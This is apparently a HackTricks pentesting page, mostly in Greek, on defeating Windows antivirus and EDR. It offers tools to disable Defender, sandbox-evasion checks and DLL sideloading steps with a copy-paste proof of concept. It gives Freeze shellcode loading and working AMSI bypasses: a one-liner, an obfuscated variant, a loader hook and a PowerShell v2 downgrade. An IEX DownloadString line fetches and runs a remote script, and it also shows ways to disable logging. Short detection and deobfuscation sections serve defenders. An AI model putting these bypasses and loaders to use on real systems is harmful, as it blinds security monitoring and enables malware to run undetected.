# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Σταματήστε το Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί προσποιούμενο άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Μεθοδολογία παράκαμψης AV**

Προς το παρόν, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο εξελιγμένα EDRs, behavioural analysis.

### **Static detection**

Η static detection επιτυγχάνεται σηματοδοτώντας γνωστές κακόβουλες αλυσίδες χαρακτήρων ή arrays of bytes σε ένα binary ή script, και εξάγοντας επίσης πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε κάνει να πιαστείς πιο εύκολα, καθώς πιθανότατα έχουν ήδη αναλυθεί και σηματοδοτηθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να αποφύγεις αυτό το είδος ανίχνευσης:

- **Encryption**

Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σου, αλλά θα χρειαστείς κάποιο loader για να το αποκρυπτογραφήσεις και να το τρέξεις στη μνήμη.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξεις μερικά strings στο binary ή το script σου για να περάσει από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να obfuscate.

- **Custom tooling**

Αν αναπτύξεις τα δικά σου tools, δεν θα υπάρχουν γνωστές bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Συστήνω ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτική AV Evasion.

### **Dynamic analysis**

Η dynamic analysis είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των browser passwords σου, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτή η πτυχή μπορεί να είναι λίγο πιο δύσκολη στην αντιμετώπιση, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις τα sandboxes.

- **Sleep before execution** Ανάλογα με το πώς είναι υλοποιημένο, μπορεί να είναι ένας πολύ καλός τρόπος παράκαμψης της dynamic analysis του AV. Τα AV έχουν πολύ μικρό χρόνο για να σαρώσουν αρχεία ώστε να μην διαταράξουν την εργασία του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλώς να παραλείψουν το sleep ανάλογα με την υλοποίηση.

- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις στροφές του ανεμιστήρα, δεν όλα θα είναι υλοποιημένα στο sandbox.

- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου ο workstation είναι joined στο domain "contoso.local", μπορείς να ελέγξεις το domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις ορίσει· αν δεν ταιριάζει, μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

Turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικά ακόμα πολύ καλά tips από [@mgeeky](https://twitter.com/mariuszbit) για αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως έχουμε πει και πιο πάνω σε αυτό το post, **public tools** τελικά **θα ανιχνευτούν**, οπότε πρέπει να αναρωτηθείς κάτι:

Για παράδειγμα, αν θέλεις να dump-άρεις το LSASS, **do you really need to use mimikatz**; ή μπορείς να χρησιμοποιήσεις ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump LSASS.

Η σωστή απάντηση είναι μάλλον το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανόν ένα από, αν όχι το πιο σηματοδοτημένο κομμάτι malware από AVs και EDRs, ενώ το project αυτό καθαυτό είναι πολύ καλό, είναι επίσης εφιάλτης να το χειριστείς για να ξεφύγεις από τα AVs, οπότε απλά ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτίμησε τη χρήση DLLs για evasion**, από την εμπειρία μου, τα DLL files είναι συνήθως **πολύ λιγότερο ανιχνεύσιμα** και αναλυόμενα, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις την ανίχνευση σε ορισμένες περιπτώσεις (αν το payload σου έχει κάποιο τρόπο να τρέξει ως DLL, φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με DLL files για να γίνεις πολύ πιο stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται το DLL search order που χρησιμοποιεί ο loader τοποθετώντας τόσο την victim application όσο και το malicious payload(s) δίπλα-δίπλα.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εξάγει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συστήνω ανεπιφύλακτα να **εξερευνήσετε DLL Hijackable/Sideloadable programs μόνοι σας**, αυτή η τεχνική είναι αρκετά stealthy όταν εκτελεστεί σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να συλληφθείτε εύκολα.

Απλώς με το να τοποθετήσετε ένα κακόβουλο DLL με το όνομα που ένα πρόγραμμα αναμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα αναμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL προς το αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Και το shellcode μας (encoded with [SGN](https://github.com/EgeBalci/sgn)) και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας συνιστώ **έντονα** να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε πιο αναλυτικά.

### Abusing Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να exportάρουν functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή export περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader θα:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Κύριες συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι ένα KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ., ntdll, kernelbase, ole32).
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο του module που κάνει την forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση που προωθείται σε ένα μη-KnownDLL module name, και τοποθετήστε μαζί (co-locate) αυτό το υπογεγραμμένο DLL με ένα DLL ελεγχόμενο από τον επιτιθέμενο που έχει ακριβώς το όνομα του forwarded target module. Όταν κληθεί το forwarded export, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Παράδειγμα παρατηρημένο σε Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το signed system DLL σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για να επιτευχθεί code execution; δεν χρειάζεται να υλοποιήσετε την forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Προκαλέστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο loader φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain`
- Αν το `SetAuditingInterface` δεν υλοποιείται, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. KnownDLLs είναι καταγεγραμμένα υπό `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε τα forwarded exports με tooling όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Παρακολουθείτε LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από non-system paths, και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Ειδοποιήστε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Εφαρμόστε πολιτικές code integrity (WDAC/AppLocker) και απαγορεύστε write+execute σε καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα payload toolkit για την παράκαμψη των EDRs χρησιμοποιώντας suspended processes, direct syscalls, και alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή ανίχνευσης είναι απλώς ένα παιχνίδι γάτας και ποντικιού — ό,τι λειτουργεί σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεσαι μόνο σε ένα εργαλείο· αν είναι δυνατόν, προσπάθησε να συνδυάσεις πολλαπλές τεχνικές evasion.

## AMSI (Anti-Malware Scan Interface)

AMSI δημιουργήθηκε για να αποτρέψει τα "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν κατάφερνες με κάποιο τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν είχε αρκετή ορατότητα για να κάνει κάτι.

Η λειτουργία AMSI είναι ενσωματωμένη στα εξής στοιχεία του Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts εκθέτοντας τα περιεχόμενα του script σε μορφή που δεν είναι κρυπτογραφημένη και δεν είναι obfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράξει το ακόλουθο alert στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατήρησε πώς προηγείται `amsi:` και μετά ακολουθεί το path προς το εκτελέσιμο από το οποίο τρέχει το script, σε αυτήν την περίπτωση powershell.exe

Δεν γράψαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά πιάσαμε in-memory εξαιτίας του AMSI.

Επιπλέον, ξεκινώντας με το **.NET 4.8**, ο C# κώδικας περνάει από AMSI επίσης. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για in-memory φόρτωση/εκτέλεση. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή χαμηλότερες) για in-memory execution αν θέλεις να αποφύγεις το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψεις το AMSI:

- **Obfuscation**

Δεδομένου ότι το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι ένας καλός τρόπος για αποφυγή ανίχνευσης.

Ωστόσο, το AMSI έχει τη δυνατότητα να απο-απο-θολώνει (unobfuscate) scripts ακόμα και αν έχουν πολλαπλά επίπεδα obfuscation, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό την καθιστά όχι τόσο απλή για παράκαμψη. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξεις μερικά ονόματα μεταβλητών και θα είσαι εντάξει, οπότε εξαρτάται από το πόσο έχει σημαδευτεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται φορτώνοντας ένα DLL μέσα στη διαδικασία powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να το τροποποιήσεις εύκολα ακόμα και τρέχοντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους για να αποφύγουν τη σάρωση του AMSI.

**Forcing an Error**

Το να εξαναγκάσεις την αρχικοποίηση του AMSI να αποτύχει (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά αυτό δημοσιοποιήθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία μόνο γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διεργασία powershell. Αυτή η γραμμή έχει, φυσικά, επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Η τεχνική αυτή ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για τη σάρωση των δεδομένων που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Παρακαλώ διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Μπλοκάρισμα του AMSI αποτρέποντας τη φόρτωση του amsi.dll (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού το `amsi.dll` φορτωθεί στην τρέχουσα διεργασία. Ένας αξιόπιστος, ανεξάρτητος από τη γλώσσα bypass είναι να τοποθετήσετε ένα user‑mode hook στο `ntdll!LdrLoadDll` που επιστρέφει σφάλμα όταν το ζητούμενο module είναι `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για αυτή τη διεργασία.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και σε προσαρμοσμένους loaders (οτιδήποτε θα φορτώσει AMSI).
- Συνδυάζεται με παροχή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφευχθούν εμφανή ίχνη στη γραμμή εντολών.
- Έχει παρατηρηθεί χρήση από loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` που καλεί `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Αφαίρεση της ανιχνευμένης υπογραφής**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια υπεργράφοντάς την με εντολές NOP, αφαιρώντας ουσιαστικά την υπογραφή από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση PowerShell έκδοσης 2**
Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, άρα μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## Καταγραφή PowerShell

Η καταγραφή του PowerShell είναι μια δυνατότητα που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για έλεγχο και αντιμετώπιση προβλημάτων, αλλά μπορεί επίσης να αποτελεί **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να spawn ένα powershell χωρίς defenses (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).


## Απόκρυψη

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### Εντολή μίας γραμμής
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του έργου είναι να παρέχει ένα open-source fork του LLVM compilation suite, ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω code obfuscation και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγονται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να σπάσει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα αρχεία pe όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame είναι ένας απλός metamorphic code engine για οποιαδήποτε executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages που χρησιμοποιεί ROP (return-oriented programming). ROPfuscator obfuscates ένα πρόγραμμα στο επίπεδο assembly code μετατρέποντας κανονικές εντολές σε ROP chains, υπονομεύοντας την φυσική μας αντίληψη του normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
